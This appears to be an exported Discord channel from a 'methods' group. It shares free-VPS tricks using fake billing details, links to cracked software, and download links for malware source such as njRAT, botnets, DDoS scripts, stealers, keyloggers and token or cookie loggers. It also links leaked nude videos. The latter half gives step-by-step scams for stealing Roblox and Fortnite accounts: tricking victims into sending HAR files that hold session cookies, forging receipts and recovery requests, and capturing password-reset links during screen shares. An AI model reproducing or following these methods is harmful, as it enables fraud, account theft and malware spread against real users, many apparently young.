+Method 2:
+Enter https://vps.apponfly.com/
+Press F12 and open Network
+Follow these Images: https://imgur.com/a/JgnUYqc
+
+Method: 3
+Requirements: - Google account - Credit Card (Can use Yandex VCC)
+
+1. Go to Google Cloud | https://cloud.google.com/free/
+2. Register and fill out all the details. Cool, Now you have 300$ free in a VPS which you can have 32 cores on, etc. enjoy)
+
+
+Method 4:
+Go to: https://turbo.net/
+Now Register an account: Select Program you want to use (Preferably Google Chrome) Enjoy Free RDP!
+SMAIL PRO | Temp mail - Temp Gmail - Disposable Fake Email
+Temp Mail? Forget it, try Temp Gmail now. Protect yourself from spam, malware and trade user information by using disposable email or fake email of SMAILPRO
+Ericom Software | Zero Trust Browser Isolation & Secure Access
+Zero Trust Browser Isolation & Zero Trust Network Access cloud solutions that block all web and phishing malware targeting users, applications, and data
+Free VPS Hosting No Credit Card Required For Trial Hosting On Windo...
+Get Best Free VPS Hosting Server (Windows, Linux) upto 1 GB RAM, 10 GB SSD Space, 1 TB Bandwidth in 1 Minute for $0.00/month for First 15 days On Trial. Simple, fast, scalable SSD cloud virtual server, No ADS No Credit Card Required.
+Method 5:
+Get a Lifetime Free VPS:
+1. Order the 'BackupHD Classic Free' euserv.com/en/cloud/reinforcement HD-free.php
+2. Log in into client board and check if the contract has been made.
+3. Wait until the contract has been handled (this take a few hours). You will get an email when it's done.
+4. Click on select behind your contract
+5. Click on Innovation and Test-Center in the left menu
+6. Click on Requested Participation behind CBCI closed Betatest
+7. Wait for your contract has been handled (this can take few-hours). Presently you can install your server through customer panel, and you have a little backup space as well.
+Method 6:
+Get a Free VPS/RDP under 5 Minutes:
+1. Go to serveroffer.lt and peruse their site for one moment or so until you get a message like this https://gyazo.com/c4...b2a6f5b77cc9d68 2. Answer them pleasantly.
+3. They will ask you on what bundle you need
+4. Pick one of their services, like VDS-10 It's excessive; I think VDS-3 or VDS-4 if possible
+5. Attempt with different servers on the off chance that you need
+6. They will likewise request an account, simply make it with fake data (fake info)
+7. They will also get some information about the OS, pick a Debian 9 since Windows commits to have an OS running and it's a waste of resources
+8. You will get your server info in your email
+Method 7:
+First, open the following Link and Sign Up to get your $10 credit. (For non-ref interface - > https://www.digitalocean.com/[This does not give you $10 credit] While filling your billing details, click on "Have a Promo Code?" at the bottom of the page. Enter any of the Promo codes to get additional credit: DOPRODUCT15 (Get $15 FREE) From the first step, you will get your first $10 credit, and by utilizing extra promotion codes, you can get up to $35 of all-out credits. Note: Some codes give more credit on higher plans. Note: If your code doesn't work at that point open a ticket and your issue ought to be solved. For Creditcard - > Utilize a VCC with low an incentive inside (For check), the rest you can utilize fakenamegenerator to fill in the details. Multi-month VPS = $5 So you'll get 5 months VPS Method 9: 1. Go to https://dash.hokoclo...login/#/register 2. Register and Confirm account from your email. 3. Go to the VPS segment - FREE VPS 4. Select Rule One - Rule One 5. Select the free plan 6. Select the Desired Server. 7. Your FREE VPS is Ready From Collection of all these Free VPS/RDP Sources. Few may not work depending on altering their TOS with time.
+Could not render this file preview.
+Villain_Methods_Booster_Rewards_Best_Out_Rn.txt
+43 KB
+Could not render this file preview.
+pack_bible.txt
+98 KB
+leaked methods from reaper's server
+https://mega.nz/file/XA8mga5a#VK_dV_GBSXa3pd5FQOOlOG5e1SNhQ1N-kIlSOsL9uTo
+52.27 MB file on MEGA
+
+legit cracked photoshop
+ https://mega.nz/file/vxUH2KZY#8XXYo3tY81U-h8UTKWcW4nk_pzAN8yg01tYPIZnK56w
+1.81 GB file on MEGA
+
+vanlx — 06/14/2021
+if i give you the titan method perks, will you give me admin?
+https://cdn.discordapp.com/attachments/847395869652811786/848818447903490108/TITAN_BOOSTING_PERKS.rar
+pass: M9UY459874VMUIQY9MU98MT48SUMBT8IT89UQM0V9YI69P8Y9WPB893W7905789W57B98S4NMVCRBENMFRUIAWO347V4N8OW4Y897YVN7TY9WA7YVT0984WTV894UVA9EUT49ESTNVS9W4VTNAVTN9ATV74N9TAN90VAVTNA404VN0A47TVODIURT48MPOVAIJEPSTOIA[PBI9YUNBM8U5SNBFIOUTJB49S8NTB49EUT RSNBEITUJB90ESB4T44444444444T4T4TTTTTTRJPSTJ4OITB9STB
+pass: hnass
+https://ghostbin.co/paste/q8krokzd/authenticate
+(credits: slack)
+
+Install sir cookie logger or get a stub from Ixwhere https://mega.nz/file/b7ZjjSCa#07jH7734EPPlJbYVvq-X80Yii1gyIhnqCMTjEleA41w and create a stub 
+
+rbxflip source
+https://cdn.discordapp.com/attachments/829090774477176862/829364109572702218/terminal_rbxflip_1.rar
+
+--------------------------------------------------------------- 
+Get Free .XYZ Domain
+Follow these steps to Grab Free .XYZ Domain. :fire:
+
+1. Go to https://gen.xyz/a/48122 :point_left:
+2. Search your domain with .XYZ
+3. Select 1 Year Plan
+4. Add Promocode "DELHI20" next
+5. Add WHOIS Security
+6. Add your PayPal or Credit Card 
+
+Done  Your order confirmed :heart_eyes: must use promocode to get Free.
+
+If you don't have PayPal or Credit Card then contact me I will give you at very cheap for getting Free Domain. 
+
+LOOT BEFORE EXPIRED 
+--------------------------------------------------------------- 
+
+850+ WORDPRESS THEMES AND PLUGINGS : https://mega.nz/folder/MBJnSQbS#j89MKGjVDpuOcyo1LRPWqg/folder/9cZFkYBT
+
+Bot NET and IoT source code : https://anonfile.com/Lcqb34j7b8/Botnet_Sources_by_Mug_rar
+
+Amazon Checker Source code : https://anonfile.com/D5YfR7dbo1/Amazon_Giftcards_rar
+
+DDOS Scripts : https://anonfiles.com/Vf56haEboa/slavic_zip | Password : stresser.vip'
+
+30+ Commands Discord Bot code : https://glitch.com/edit/#!/free-source-liridon
+
+Discord Spammer Tool Source Code : https://anonfiles.com/T3FbNaweoa/Alpha_Spammer_rar
+
+https://cdn.discordapp.com/attachments/748334078884839455/750427303418396833/FacebookTor.txt
+
+Desync.vip Source Code : https://anonfile.com/P7L2kdp9oc/desync.vip_source_code_rar
+
+Trixware Source Code : https://anonfile.com/f2t3hfS2na/TrixWare_Source_zip
+
+njRAT Source Code : https://mega.nz/folder/mPBSQSiA#dC9YLMyOZVk72orABAwl0A
+
+Nude Leaks !
+
+https://clipwatching.com/lggfqueqssgi/Aa...1.mp4.html
+https://clipwatching.com/w19v0xbh59yu/Aa...e.mp4.html
+https://clipwatching.com/b13acuvystnr/Am...).mp4.html
+https://clipwatching.com/qb3998u44yq5/Ap...s.mp4.html
+https://clipwatching.com/pw2w5wxaayrs/Be...1.mp4.html
+https://clipwatching.com/f805b5vl57at/Be...2.mp4.html
+https://clipwatching.com/lxgmghigmpal/ey...s.mp4.html
+https://clipwatching.com/9495nkhk92by/Ho...s.mp4.html
+https://clipwatching.com/7iq2g8xboo23/Mi...l.mp4.html
+https://clipwatching.com/70mwgedlcel7/Nu...1.mp4.html
+
+BITCOIN METHOD
+https://iancoleman.io/bip39/#english
+https://www.blockchain.com/
+https://temp-mail.org/en/
+ON THE MNEMONIC SITE THERE YOU NEED TO PUT GENERATE MEMONIC NUMBER 12
+THEN JUST CLICK GENERATE
+COPY THE GENERATED MEMONIC CODE,
+GO TO BLOCKCHAIN ACCOUNT RECOVERY
+https://login.blockchain.com/#/help
+CLICK RECOVER FUNDS
+PASTE THE GENERATED MEMONIC CODE
+THEN GO TO TEMP MAIL AND COPY THE MAIL ADDRESS AND PASTE THERE, TAP CHANGE PASSWORD
+AFTER THAT YOU WILL GET FREE BITCOINS, [ SOME OF THEM MAY NOT CONTAIN BALANCE ]
+.xyz
+.xyz Domain Names | Join Generation XYZ
+.xyz is for every website, everywhere.™ We offer the most flexible and affordable domain names to create choice for the next generation of internet users.
+
+File on MEGA
+
+vanlx — 06/14/2021
+https://mega.nz/file/Lh1mBJKb#nEKo2xbfGhqC4nr5l9AqXkq2PgW5-BHA5fSnXWXJxB0
+700.5 KB file on MEGA
+
+2k_Methods_Beasts_Cookies
+https://mega.nz/file/Lgt0SJoY#RwubBo6j8kSN9cHdn8-5i6uWLP6AZANy6jXLdpf6QnI
+655.2 KB file on MEGA
+
+2x_Boost_Pack
+https://mega.nz/file/j58UFLpQ#2b51wLdWUVqK5FSThMgzjl-hG0qaCj6MRhB2elWIVVY
+91.07 MB file on MEGA
+
+50+ METHOD PACK
+https://mega.nz/file/uxkkiJjb#dF9L7KtG8ZJ_bui8rqFFTkvKeE0BC_yb1zEuAUuQnwI
+429.7 KB file on MEGA
+
+Beast_Cookie 
+https://mega.nz/file/u59U0J7a#o27dVn82a76zmWAuk_H4J43YPtnrqUpnCzWkSY7SXRo
+13.6 KB file on MEGA
+
+Discord-DM-Bot-master
+https://mega.nz/file/ypsyWLBZ#NSNYBQzfYY-cRh-i56i90LI0baUR2IFMVfATF9E9uKc
+3.5 KB file on MEGA
+
+Force the Venom
+https://mega.nz/file/v40ATTyQ#JqhbuDzh5sO2c7v9rrgWlObPzONaBUcNNbVpLJkMffo
+595.4 KB file on MEGA
+
+GODLY_LEAKS
+https://mega.nz/file/vxk2yZLa#CPFKKl8RZsyhFB1M-Vhf7xhaSzZzrwZm3hUSNot-Lfg
+10.6 KB file on MEGA
+
+vanlx — 06/16/2021
+https://www.mediafire.com/file/b599qq8til1bh4g/Dr_Cleans_PayPal_Methods.pdf/file
+MediaFire
+Dr_Cleans_PayPal_Methods
+
+Attachment file type: archive
+LimitedOrItem_Sniper.zip
+4.85 KB
+Attachment file type: archive
+Pyrex_1.0.4_1.rar
+1.78 MB
+vanlx — 06/21/2021
+photoshop 
+https://mega.nz/file/vxUH2KZY#8XXYo3tY81U-h8UTKWcW4nk_pzAN8yg01tYPIZnK56w
+1.81 GB file on MEGA
+
+vanlx — 06/23/2021
+https://cdn.discordapp.com/attachments/851446937005457416/852929543022837810/BM_Booster_Leak.rar
+https://cdn.discordapp.com/attachments/851446937005457416/852929596927901696/Jesters_Methods_FULL-1.zip
+2K Methods
+https://cdn.discordapp.com/attachments/851446937005457416/852935835774091275/2000_Methodz_1.rar
+CookieLoggerExtension
+https://cdn.discordapp.com/attachments/851446937005457416/852936229136629810/CookieLoggerExtension_1.zip
+Could not render this file preview.
+message.txt
+7 KB
+vanlx — 06/23/2021
+# Discord programs
+
+Vanity hack :: https://cdn.discordapp.com/attachments/785327015611858954/785327867801763840/vanity-exploit-master.zip
+
+Nitro hack :: https://cdn.discordapp.com/attachments/785327015611858954/785328195104145408/Nitro-generator-master.zip
+
+Rich presents hack :: https://strukteon.net/projects/
+
+Console hacks :: https://hastebin.com/uwuniwibev.rb
+
+Fastest nitro sniper :: https://cdn.discordapp.com/attachments/785327015611858954/785328530271371264/Sniper_1.rar
+
+Rich presents for chrome :: https://cdn.discordapp.com/attachments/785327015611858954/785329529497321502/Chrome-RPC-master.zip
+
+discord password changer :: https://cdn.discordapp.com/attachments/785327015611858954/785328676006264832/Discord-Pass-Change-master.zip
+
+Spamisfun CRACK :: https://cdn.discordapp.com/attachments/785327015611858954/785329065841524736/spamis.fun.zip
+
+Visary selfbot open source :: https://cdn.discordapp.com/attachments/785327015611858954/785329171526057994/Visary-master.zip
+
+Xyliase account creator crack :: https://cdn.discordapp.com/attachments/785327015611858954/785328905330360330/Xyliase-master.zip
+
+Discord edit message glitch :: https://cdn.discordapp.com/attachments/785327015611858954/785328902939476008/Discord_Edited_Message_Glitch.rar
+
+Discord raid toolbox open source :: https://cdn.discordapp.com/attachments/785327015611858954/785329702033424435/Raid-Toolbox-master.zip
+
+DiscordHAXX open source :: https://cdn.discordapp.com/attachments/785327015611858954/785329721084346378/DiscordHaxx-1.9-master.zip
+
+MKV2 discord account maker :: https://cdn.discordapp.com/attachments/785327015611858954/785329810720423966/MKV2-master_2.zip
+
+DISCORD HACK TOOL :: https://cdn.discordapp.com/attachments/785327015611858954/785330298837008404/Synthia.rar
+
+Discord mass reporter :: https://cdn.discordapp.com/attachments/785327015611858954/785330614185230367/Discord-Reporter-master.zip
+
+Discord custom status :: https://cdn.discordapp.com/attachments/785327015611858954/785330615875797062/Discord-Custom-status-master.zip
+
+sticker spammer :: https://cdn.discordapp.com/attachments/785327015611858954/785330832343826452/StickerSpammer.rar
+Webhook spammer :: https://cdn.discordapp.com/attachments/785327015611858954/785330834223530014/WebhookSpammer.rar
+
+Token brute forcer :: https://cdn.discordapp.com/attachments/785327015611858954/785331043090563112/Discord-Token-Brute-Force-main.rar
+
+open source token logger :: https://cdn.discordapp.com/attachments/785327015611858954/785331147869519882/python-token-grabber-master.zip
+
+block bypass source code :: https://cdn.discordapp.com/attachments/785327015611858954/785331161605341245/Bypass-Block-Message-master.rar
+
+Message purger :: https://cdn.discordapp.com/attachments/785327015611858954/785331368107180032/Discord-Message-Cleaner-selfbot-master.zip
+
+Discord messagge logger :: https://cdn.discordapp.com/attachments/785327015611858954/785331448139874305/Discord-Logger-master.zip
+
+token warn :: https://cdn.discordapp.com/attachments/785327015611858954/785331524211834880/tokenwarn-master.zip
+
+Token checker :: https://cdn.discordapp.com/attachments/785327015611858954/785331587944284200/Discord-Token-Checker-master.zip
+
+Discord ip logger :: https://cdn.discordapp.com/attachments/785327015611858954/785331672644190218/Discord-IP-Grabber-master.zip
+
+Discord mass reporter :: https://cdn.discordapp.com/attachments/785327015611858954/785331948008636466/Discord-Reporter-master.zip
+
+Discord account backup :: https://cdn.discordapp.com/attachments/785327015611858954/785332172764217354/Discord-Account-Backup-Bot-master.zip
+
+Discord hype squad changer :: https://cdn.discordapp.com/attachments/785327015611858954/785332258714288129/Discord-Hypersquad-Badges-master.zip
+
+Discord friend decliner :: https://cdn.discordapp.com/attachments/785327015611858954/785332766178410526/Discord-Friend-Requests-Decliner-master.zip
+
+Discord hijacker :: https://cdn.discordapp.com/attachments/785327015611858954/785332850177867786/discord-hijacker-master.zip
+
+Discord nitro purchaser :: https://cdn.discordapp.com/attachments/785327015611858954/785332990988517386/discord-nitro-purchaser-master.zip
+
+
+# Other programs
+
+PDF cracker :: https://cdn.discordapp.com/attachments/785327015611858954/785328921830621184/pdf_crack-master.zip
+
+Github name checker :: https://cdn.discordapp.com/attachments/785327015611858954/785329038943059988/github-name-checker-master_1.zip
+
+Spotify acccount maker :: https://cdn.discordapp.com/attachments/785327015611858954/785329076365688852/Spotify-Account-Creator-master.zip
+
+Bitcoin hacks :: https://cdn.discordapp.com/attachments/785327015611858954/785330443188699176/BitGen_Source.rar
+
+Among us hack :: https://cdn.discordapp.com/attachments/785327015611858954/785330540990955540/Confused_1_1.7z
+
+type racer bot :: https://cdn.discordapp.com/attachments/785327015611858954/785330632175124510/TypeRacer-Bot-master.zip
+
+zoom code scraper :: https://cdn.discordapp.com/attachments/785327015611858954/785330633413099540/Zoom-Code-Scraper-master.zip
+
+Twitch bot :: https://cdn.discordapp.com/attachments/707802647100391454/709519110375080006/Twitch.BOT.rar
+
+# Txt
+http proxies :: https://cdn.discordapp.com/attachments/785327015611858954/785329934511374336/http_proxies.txt
+NordVPN accounts :: https://cdn.discordapp.com/attachments/707802647100391454/710307848835432568/NordVpn_Fresh_hits.txt
+1k steam accounts :: https://cdn.discordapp.com/attachments/707802647100391454/710308048777904179/1k_Steam_No-2FA.txt
+Free RDP method :: https://cdn.discordapp.com/attachments/710211674250149981/711352028852387980/RDP-FREE-METHOD.txt
+Wifi hack tutorial :: http://www.mediafire.com/file/fg58biqpd5h42wr/How_to_Hack_WiFi_Networks_for_Beginners.zip/file
+free G2A games :: https://cdn.discordapp.com/attachments/653519497717874688/712797803948146708/G2A-FREE-GAMES.txt
+vanlx — 06/23/2021
+Could not render this file preview.
+pack_bible.txt
+98 KB
+vanlx — 08/11/2021
+Could not render this file preview.
+message.txt
+8 KB
+vanlx — 08/11/2021
+https://github.com/Tyrrrz/DiscordChatExporter/releases/tag/2.30
+GitHub
+Release 2.30 · Tyrrrz/DiscordChatExporter
+Changelog
+
+vanlx — 08/16/2021
+Spotify Tools PACK    https://gofile.io/d/onqO1L
+Discord Tools PACK    https://gofile.io/d/bnKOC6
+Netflix Tools PACK    https://gofile.io/d/zzayVN
+Basic Utilities Tools    https://gofile.io/d/xeFtCl
+BlackBullet COLLECTION    https://gofile.io/d/iUvhH1
+Bots - Traffic - Automatic Tools    https://gofile.io/d/fce3La
+Checkers PACK    https://gofile.io/d/Jsc9tq
+Crypters & Binders    https://gofile.io/d/zzF6rt
+Crypto Bots - Utilities - Btc TOOLS    https://gofile.io/d/rWptza
+DDOS - DDOSER Tools    https://gofile.io/d/XUMavO
+Dorkers Premium    https://gofile.io/d/nlQ0xy
+Hacking Software    https://gofile.io/d/AMlLzR
+Keyloggers PACK    https://gofile.io/d/MNZQgx
+Malware - Worms Stealers    https://gofile.io/d/8OaYEo
+OpenBullet COLLECTION    https://gofile.io/d/basDaf
+Proxy Tools and Grabbers    https://gofile.io/d/4glJtL
+RATS PACK    https://gofile.io/d/pDqzMG
+Remote Hacking Tools PACK    https://gofile.io/d/OA7c2u
+SEO Tools Utilities    https://gofile.io/d/TcMC0V
+SQLi TOOLS    https://gofile.io/d/KX2Q4T
+Vulnerabilities Scanners    https://gofile.io/d/oo49Ao
+Youtube - Twitch - Social TOOLS    https://gofile.io/d/Jwk709
+Proxy & VPN Tools & Utilities PACK    https://gofile.io/d/1Ptrks
+Uninstallers Tools PACK    https://gofile.io/d/ebzceW
+USB Tools PACK    https://gofile.io/d/Cgwo0S
+Video Downloaders    https://gofile.io/d/WOLsiK
+Virtual PC Sandbox Programs PACK    https://gofile.io/d/Fe7O6l
+ALL IN ONE SUITES - Photo Editing - Graphics - Pic Viewers - Rezizing - Converting - Color & MORE    https://gofile.io/d/fOXPYX
+All in One Windows TOOLS - Optimizers - Boosters - Fixers - SpeedUP    https://gofile.io/d/GHmfC7
+Download Managers PACK    https://gofile.io/d/tEGjlI
+DRIVERS Tools & Utilities PACK    https://gofile.io/d/1NryYE
+Emulators PACK    https://gofile.io/d/LoUnN6
+Spotify Tools PACK.rar
+109 views
+
+Discord Tools PACK.rar
+140 views
+
+Netflix Tools PACK.rar
+154 views
+
+Basic Utilities Tools.rar
+168 views
+
+BlackBullet COLLECTION.rar
+42 views
+
+Could not render this file preview.
+message.txt
+16 KB
+https://cdn.discordapp.com/attachments/874675770558136380/876810930191736892/discordhaxx_1.9.zip
+https://cdn.discordapp.com/attachments/874675770558136380/876811063188946944/mass-discord-webhook-sender-main.zip
+[Manager] stab — 08/29/2021
+Attachment file type: archive
+NMMS-Malwarebytes_Premium_4.2.0.82_Multilingual.rar
+8.28 MB
+Malwarebytes premium forever (license)
+[Manager] stab — 08/29/2021
+https://mega.nz/file/q75yHSoK#mUXcH1zYsJ4IbHHLSuQLKmd7MlX54JUSajYuvMjczjQ
+File on MEGA
+
+^photoshop 2021
+
+ive gotten reports that theres an issue with the setup but some say it works, let me know if you get an error. i have a fix if it happens
+@everyone DM me if you want a cracked software added here!
+ill be dropping some more yt premium codes in chat if you're active!
+[Manager] stab — 08/29/2021
+https://mega.nz/file/iv5yyC7b#RCtVjioXtzV40Cxm3tiq9XPKkRkcS0q7cmBx-FMwb-U
+File on MEGA
+
+cinema 4d ^^^
+[Manager] stab — 08/30/2021
+https://mega.nz/folder/zaQmzDDY#rVSrZFxugztvBfvZ5Cox1g/folder/LKQkFLQY
+Methods and more
+File folder on MEGA
+
+
+vanlx — 09/01/2021
+Valorant cheat might be detected by valorant.
+[Head Admin] sin — 09/07/2021
+https://mega.nz/folder/nSo2xDrI#HcXUg_Z3JObOejnQmA5Tyw
+278.81 MB folder on MEGA
+8604 files and 89 subfolders
+
+vanlx — 09/14/2021
+Adopt Me Dupe 
+
+1) Trade all of your pets to an alt account and tell Adopt Me you were scammed.
+2) On your alt account, trade your pets for other pets and trade the new pets to two different alt accounts.
+3) Send the new pets to your account that was "scammed" and your Adopt Me pets should be duplicated. 
+Second method :1) Create an ad in Marketplace servers, saying that you're selling Adopt Me pets.
+2) Sell the pets and use a middleman.
+3) Request your pets back from Adopt Me using the Trade License and use the trade where you gave the user the pets as proof.
+
+This is an exe that was created to signup faster on Roblox! 
+
+If you do not trust this executable you can run it using a Virtual-Machine or scan it with Virustotal
+https://www.mediafire.com/file/d59gpciqxxpsc33/Signup_Fast.rar/file
+extra free premium method
+
+1.) Cancel your premium on the very last day (make sure you purchased it with paypal) 
+
+2.) You'll get an extra 3 days of premium you won't receive any robux after the extension of your subscription
+
+3.) Enjoy extra days of premium
+Method to get 2letter display name
+
+1. Connect To Germany Using A VPN
+2. Go To Your Roblox Profile And Copy The ID
+3.Go To This Website 
+https://users.roblox.com/docs#!/DisplayNames/patch_v1_users_userId_display_names
+4.In The ID Section Put Your ID
+5.In Request Box Paste this
+
+{
+ "newDisplayName": "ss\n"
+}
+
+6. Change ss to the name you want  ( you can bypass some names like you can use Chinese letters and can have 2 letter name and ROBLOX works as well)
+
+7. Scroll little down and click Try It Out!
+
+NOTE!: You Have To be Logged In The Account You Want To Do This On
+IF You Got Any Questions Feel Free To Ask ME
+font method 2
+
+Search up řóleplay or úńhôlyřoleplay or something like that 
+Possible passwords for those accounts
+
+Roleplay
+Roleplay1
+Roleplay12
+Roleplay123
+roleplay
+roleplay1
+roleplay12
+roleplay123
+arabic digit method
+
+Example of name ٠١٢٠٧٤٦٨٢٣٢
+Works 25% of the time
+
+1.Find an Arabic name you would like to pull.
+
+2.Go to google translate and type the arabic name into english and translate it to arabic to get the numbers
+
+3.go to log in type the Font as username and the regular letters as the pass and then u have a arabic Font.
+How to pull fortnite accounts
+
+First your going to go to epicgames.com sign into your account then press help then go to accounts then press
+ contact us once you do that type the account your trying to pulls username and platform then type (YOUR EMAIL) 
+and where it says describe your problem say (Hello epicgames I recently lost access to the email on epicgames
+ due to a hacker i've tried to recover it many times and couldn't and then I contacted you guys and want a email 
+verification to the email to the email that was hacked but my account is unverified I've spent so much on that account just help me get it back,please just.)
+Roblox Pulling Method
+
+1) Find a victim and say you will pay them 2k robux if they help you. Get them to add you on discord
+ 
+2) On discord, tell them they need to download an audio for you, and you will pay the 2k if they do it correctly.
+ 
+3) Give them a random audio, and tell them to press ctrl + shift + i (inspect). Tell them to go to network; and refresh the page
+ 
+4) Tell them to scroll to the top; and it should say the name of the audio.
+ 
+5) Tell them to right click that, and click save all as HAR with content.
+ 
+6) Tell them to send you the .har file.
+ 
+7) Open the file with notepad and press ctrl + f and put "cookie" in the box and click "find next". If their cookie doesn't show up the first time you click it; do it again until it goes to their .roblosecurity.
+Email Reset Method: 
+
+1.Dm Roblox saying ur account was compromised.and u can give recipets to prove its yours
+
+2.Give it a couple days and they should respond back saying something else like"please provide the first billing email that was accocitated with the account"
+
+3.reply back saying the hacker hacked all my emails so i dont have it
+
+4.if your lucky and you picked someone who used a giftcard,itunes they will ask for the itunes receipt
+
+5.go to your victims inventory,find the bc hat once you find it go to owners and find them in that list
+
+6.Get the itunes reciept template and edit  it so the name is ur victims username,and the date and price is the same as well 
+
+7.send that to roblox saying"is crying and shaking"according to zast and they will revert the email for that account to you
+*might not work im not sure
+Youtube Method
+
+The Youtube Method is a way to auto Upload your videos without having to. You Should do this on multiple Accounts to get some attention and Maybe get a rich Roblox trader.
+
+Anyways, You want to Make a video which Will scam the person that Follows the steps. Then you want to upload it to Youtube. You COULD Upload the same videa from everyday on, But who has the energy to do that? So you want to click Uplaod video and Do your normal stuff when uoloading the video. But at the END you will see a "Schedule" Option.
+
+Click it and make it the next day at any time you want. Continue to do this another day and I would recommend Doing it for 1 month. So you can do this 30 times, every day from then.
+
+I got MANY Hits from this as I spent at least 1 week making it so it can upload everyday for 1 year
+
+Good luck!
+
+password reset method
+
+=======================================
+STEP 1: Go To Trade Hangout
+  STEP 2:Go arround the gae saying "Who here does paypal deals?" (If someone there does, they will know what that means)
+  STEP 3: Once you find someone, give them a realistic offer for ONE of their items.
+  STEP 4: Once they agree on some price, get their skype / discord.
+  STEP 5: Go on skype / discord and ask them for their paypal email
+  STEP 6: Once they give it to you, wait about a minute and say "Sent!"
+  STEP 7: They should go check and they will tel you they never got it
+  STEP 8: Call them a scammer and make them believe you might actually sent or they think it was a paypal error
+  STEP 9: Tell them to share their screen on paypal
+  STEP 10: Once they show it is not there, open up a new roblox tap
+  STEP 11: Copy their roblox username and then go to the password reset URL: (https://www.roblox.com/Login/ResetPasswordRequest.aspx)
+  STEP 12: Paste their roblox username in, and spam click the password reset button until it says, "Too many failed request attemps. Try your request again later."
+  STEP 13: Go back to skype / discord and tell them to check their email and see if they got a paypal notification there
+  STEP 14: When they go to their email, they should notice all of the password reset links, they will see them all and think wtf. Odds are very high they will at least open one.
+  STEP 15: QUICKLY, using snipping tool or some other screenshot method, screenshot the call while they are inside the roblox email.
+  STEP 16: Open it in some picture editing program and zoom in to see the password reset URL
+  STEP 17: CAREFULLY, copy in the exact URL into a new tab in your browser
+  STEP 18: Change their password and quickly log in, send yourself a trade of all their good items for your bad one, accept the trade, and then end the skype / discord call and block the other guys skype / discord
+========================================
+Methods posted by 478802978690564106 & 679038328326324235
+#discord.gg/nmms
